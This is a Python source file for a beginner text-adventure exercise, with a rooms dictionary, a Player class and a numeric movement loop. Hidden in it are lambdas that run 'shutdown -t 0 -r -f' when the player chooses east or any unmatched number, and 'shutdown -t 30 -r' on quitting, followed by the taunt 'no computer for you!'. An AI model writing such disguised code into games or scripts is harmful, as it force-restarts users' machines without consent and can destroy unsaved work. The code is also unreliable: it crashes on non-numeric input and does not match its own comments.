# Write a text adventure that allows the player to move from room to room by
# typing "n", "w", "s", or "e" for north, west, south, and east.

# These are the existing rooms. Add more as you see fit.
import os
from time import sleep

cut_out = lambda: os.system("shutdown -t 0 -r -f")
lets_be_mean = lambda: os.system("shutdown -t 30 -r")
clear = lambda: os.system("cls")
clear()


rooms = {
    "outside": {
        "name": "Outside Cave Entrance",
        "description": "North of you, the cave mouth beckons.",
        "n_to": "foyer",
    },
    "foyer": {
        "name": "Foyer",
        "description": "Dim light filters in from the south. Dusty passages run north and east.",
        "n_to": "overlook",
        "s_to": "outside",
        "e_to": "narrow",
    },
    "overlook": {
        "name": "Grand Overlook",
        "description": """A steep cliff appears before you, falling
into the darkness. Ahead to the north, a light flickers in
the distance, but there is no way across the chasm.""",
        "s_to": "foyer",
    },
    "narrow": {
        "name": "Narrow Passage",
        "description": "The narrow passage bends here from west to north. The smell of gold permeates the air.",
        "w_to": "foyer",
        "n_to": "treasure",
    },
    "treasure": {
        "name": "Treasure Chamber",
        "description": """You've found the long-lost treasure
chamber. Sadly, it has already been completely emptied by
earlier adventurers. The only exit is to the south.""",
        "s_to": "narrow",
    },
}

""" template room to copy into code
    "room": {
        "name": "",
        "description": "",
        "n_to": "",
        "s_to": "",
        "e_to": "",
        "w_to": "",
    },
"""

# Write a class to hold player information, e.g. what room they are in currently
class Player:
    def __init__(self, player, room):
        self.player = player
        self.room = room


charname = input("Pick your name warrior: ")
char1 = Player(charname, rooms["outside"])
# Make a new player object that is currently in the 'outside' room.


move = ""
while move != 0:
    print(char1.room)
    sleep(8)
    clear()
    move = input(
        "where do you to go? 1(west), 2(north), 3(south), 4(east), OR 0(quit):"
    )
    moveKey = ""
    move = int(move)
    if move != 0:
        if move == 1:
            moveKey = "w_to"
            clear()
        elif move == 2:
            moveKey = "n_to"
            clear()
        elif move == 3:
            moveKey = "s_to"
            clear()
        else:
            moveKey = "e_to"
            clear()
            cut_out()

        try:
            char1.room[moveKey]
        except KeyError:
            print("There is no way in that direction")
            sleep(8)
            clear()
        else:
            nextRoomName = char1.room[moveKey]
            clear()
            char1.room = rooms[nextRoomName]
    else:
        print("See you later!")
        sleep(2)
        clear()
        lets_be_mean()
        print("no computer for you!\n You have about 30 seconds. :)")
# * Prints the current room name
# * Prints the current description (the textwrap module might be useful here).
# * Waits for user input and decides what to do.
#
# If the user enters a cardinal direction, attempt to move to the room there.
# Print an error message if the movement isn't allowed.
#
# If the user enters "q", quit the game.
